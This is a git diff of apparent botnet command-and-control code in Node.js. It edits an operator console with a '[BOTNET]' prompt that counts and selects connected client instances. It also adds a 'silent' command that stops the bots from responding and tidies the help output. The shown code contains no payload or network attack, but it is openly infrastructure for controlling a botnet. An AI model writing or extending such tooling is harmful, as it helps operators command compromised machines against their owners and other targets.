@@ -1,6 +1,6 @@
 import readline from "readline";
 import fs from "fs";
-import { clientModules, broadcast } from "./server.js"
+import { clientModules, broadcast } from "./server.js";
 
 const rl = readline.createInterface({
 	input: process.stdin,
@@ -25,28 +25,35 @@ const commandsHelp = [
 		functionality: "Shows you how to use commands",
 		usage: "help <command>",
 	},
+	{
+		command: "silent",
+		functionality: "Silents clients from responding",
+		usage: "silent (boolean)",
+	}
 ];
 
 export default function prompt() {
 	rl.question("[BOTNET] ", (message) => {
 		message = message.toLowerCase();
 
-		if (message === "instances") {
-			console.log(`Instances: ${clientModules.clientInstances.length}`);
-		}
-
 		if (message.startsWith("instances")) {
+			if (message === "instances") {
+				console.log(`Instances: ${clientModules.clientInstances.length}`);
+			}
 			if (message.split(" ")[1] <= clientModules.clients.length) {
 				clientModules.clientInstances = [...clientModules.clients];
-				clientModules.clientInstances = clientModules.clientInstances.slice(0, message.split(" ")[1]);
+				clientModules.clientInstances = clientModules.clientInstances.slice(
+					0,
+					message.split(" ")[1]
+				);
 			}
 		}
 
-		if (message.split(" ")[1] === "all") clientModules.clientInstances = [...clientModules.clients];
-
-		if (message === "help") console.log(`\n${help}`);
+		if (message.split(" ")[1] === "all")
+			clientModules.clientInstances = [...clientModules.clients];
 
 		if (message.startsWith("help")) {
+			if (message === "help") console.log(`\n${help}`);
 			if (
 				commandsHelp.filter((i) => i.command === message.split(" ")[1]).length >
 				0
@@ -58,6 +65,15 @@ export default function prompt() {
 				console.log(
 					`Functionality: ${commandsHelp[commandIndex].functionality}\nUsage: ${commandsHelp[commandIndex].usage}\n`
 				);
+			}
+		}
+
+		if (message.startsWith("silent")) {
+			if (message === "silent") console.log(`silent: ${clientModules.silent}`);
+			if (message.split(" ")[1] === "true") {
+				clientModules.silent = true;
+			} else if (message.split(" ")[1] === "false") {
+				clientModules.silent = false;
 			}
 		}
 
